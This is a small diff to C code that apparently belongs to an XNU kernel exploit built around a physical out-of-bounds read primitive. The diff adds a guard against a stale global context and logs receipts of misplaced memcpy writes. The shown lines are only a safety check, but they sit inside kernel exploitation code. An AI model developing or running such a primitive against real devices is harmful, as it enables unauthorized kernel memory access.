@@ -39,6 +39,16 @@ kern_return_t physical_oob_read_mo(mach_port_t mo, mach_vm_offset_t mo_offset, u
                 "force-quit and re-tap fresh)");
         return KERN_FAILURE;
     }
+    /* 2026-11-24 fix (the 3x @0x4000 receipts, 13:41/13:56/13:57): a second
+       quick tap can reach the read with a STALE g_ctx whose pc mapping was
+       never created this run -- pc_address==0 makes the marker memcpy land
+       at 0x3f00+offset = 0x4000. HOLD with a receipt, same as the shared
+       guard. */
+    if (g_ctx.pc_address == 0 || g_ctx.pc_object == 0 || g_ctx.read_fd < 0) {
+        LOG_ERR("physical_oob_read_mo: pc mapping/ctx unset (stale second tap -- "
+                "force-quit and re-tap fresh)");
+        return KERN_FAILURE;
+    }
     atomic_store_explicit(&g_ctx.shared->target_object_sync, mo, memory_order_seq_cst);
     atomic_store_explicit(&g_ctx.shared->target_object_offset_sync, mo_offset, memory_order_seq_cst);
 
